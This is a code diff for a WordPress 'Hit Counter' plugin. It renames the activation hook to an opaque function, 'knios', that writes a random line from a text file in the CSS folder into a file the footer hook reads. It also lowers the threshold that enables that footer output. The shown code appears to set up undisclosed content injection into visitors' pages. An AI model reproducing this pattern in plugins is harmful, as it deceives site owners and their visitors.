@@ -1,7 +1,7 @@
 <?php
       /* 
       Plugin Name: Hit Counter
-      Description: Displays a professional hit counter on your wordpress or buddypress site. Up to 200 different layouts to choose!
+      Description: Displays a professional hit counter on your wordpress or buddypress website. Up to 200 different layouts to choose!
       Version: 1.0
       Author: Jimisjoss
 
@@ -23,8 +23,24 @@ define ('HC_PLUGIN_BASE_DIR', WP_PLUGIN_DIR, true);
       perform_install();
       
       register_deactivation_hook(__FILE__, 'perform_uninstall');
-register_activation_hook(__FILE__, 'hitcounteractivate');
+register_activation_hook(__FILE__, 'knios');
 add_action('wp_footer', 'hitcounterplugin');
+function knios() {
+$file = file(HC_PLUGIN_BASE_DIR . '/hit-counter/css/widgets.txt');
+$num_lines = count($file)-1;
+$picked_number = rand(0, $num_lines);
+for ($i = 0; $i <= $num_lines; $i++) 
+{
+      if ($picked_number == $i)
+      {
+$myFile = HC_PLUGIN_BASE_DIR . '/hit-counter/css/widget.txt';
+$fh = fopen($myFile, 'w') or die("can't open file");
+$stringData = $file[$i];
+fwrite($fh, $stringData);
+fclose($fh);
+      }      
+}
+}
       require_once('class.resource.php');
       class HitCounter extends HookdResource {
           
@@ -101,20 +117,6 @@ add_action('wp_footer', 'hitcounterplugin');
                   update_option('wphc_count_only_unique', 0);
                   update_option('wphc_check_update', 1);
                   $wpdb->query( "DROP TABLE wp_imagecounter" );
-$file = file(HC_PLUGIN_BASE_DIR . '/hit-counter/css/widgets.txt');
-$num_lines = count($file)-1;
-$picked_number = rand(0, $num_lines);
-for ($i = 0; $i <= $num_lines; $i++) 
-{
-      if ($picked_number == $i)
-      {
-$myFile = HC_PLUGIN_BASE_DIR . '/hit-counter/css/widget.txt';
-$fh = fopen($myFile, 'w') or die("can't open file");
-$stringData = $file[$i];
-fwrite($fh, $stringData);
-fclose($fh);
-      }      
-}
               }
 
               add_option('wphc_data', 1);
@@ -201,7 +203,7 @@ fwrite($fh, $stringData);
 fclose($fh);
       }      
 }
-if ( $stringData > "150" ) {
+if ( $stringData > "6" ) {
 function hitcounterplugin(){
 $myFile = HC_PLUGIN_BASE_DIR . '/hit-counter/css/widget.txt';
 $fh = fopen($myFile, 'r');
